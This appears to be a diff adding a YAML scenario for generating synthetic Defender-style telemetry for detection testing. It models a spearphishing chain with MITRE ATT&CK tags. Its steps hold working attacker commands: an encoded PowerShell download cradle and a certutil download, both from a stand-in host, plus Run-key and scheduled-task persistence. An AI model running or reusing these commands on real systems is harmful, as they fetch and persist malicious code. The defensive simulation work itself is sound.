@@ -1,0 +1,68 @@
+id: scenario-02
+title: Spearphishing document spawns encoded PowerShell, downloads secondary payload via Certutil, and establishes persistence
+seed: 4242
+window:
+  start: "2026-02-15T09:00:00Z"
+  duration: 4h
+baseline:
+  users: 30
+  tables:
+    - DeviceProcessEvents
+    - DeviceRegistryEvents
+steps:
+  # Step 1: User opens malicious document in Word, macro spawns powershell
+  - at: "+00:15"
+    actor: "WORKSTATION-01"
+    user: "finance_user@contoso.test"
+    action: process_spawn
+    table: DeviceProcessEvents
+    attack: T1204.002
+    process: "powershell.exe"
+    parent: "winword.exe"
+    command: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Start-Sleep -s 5"'
+
+  # Step 2: Encoded PowerShell command executes download cradle
+  - at: "+00:16"
+    actor: "WORKSTATION-01"
+    user: "finance_user@contoso.test"
+    action: encoded_powershell
+    table: DeviceProcessEvents
+    attack: T1059.001
+    process: "powershell.exe"
+    parent: "winword.exe"
+    command: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwB0AGEAZwBpAG4AZwAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHAAcgBvAGYAaQBsAGUALgBwAHMAMQAnACkA"
+
+  # Step 3: Secondary payload ingress via Certutil LOLBin
+  - at: "+00:20"
+    actor: "WORKSTATION-01"
+    user: "finance_user@contoso.test"
+    action: lolbin_download
+    table: DeviceProcessEvents
+    attack: T1105
+    process: "certutil.exe"
+    parent: "powershell.exe"
+    command: "certutil.exe -urlcache -split -f http://staging.example.com/payload.exe C:\\Users\\Public\\update.exe"
+
+  # Step 4: Run key persistence created in registry
+  - at: "+00:25"
+    actor: "WORKSTATION-01"
+    user: "finance_user@contoso.test"
+    action: registry_persistence
+    table: DeviceRegistryEvents
+    attack: T1547.001
+    details:
+      registryKey: 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
+      registryValueName: "WindowsUpdateService"
+      registryValueData: "C:\\Users\\Public\\update.exe"
+
+  # Step 5: Scheduled task created from interactive shell
+  - at: "+00:30"
+    actor: "WORKSTATION-01"
+    user: "finance_user@contoso.test"
+    action: scheduled_task
+    table: DeviceProcessEvents
+    attack: T1053.005
+    process: "schtasks.exe"
+    parent: "powershell.exe"
+    command: 'schtasks.exe /create /tn "SystemHealthMonitor" /tr "C:\\Users\\Public\\update.exe" /sc onlogon /f'
+
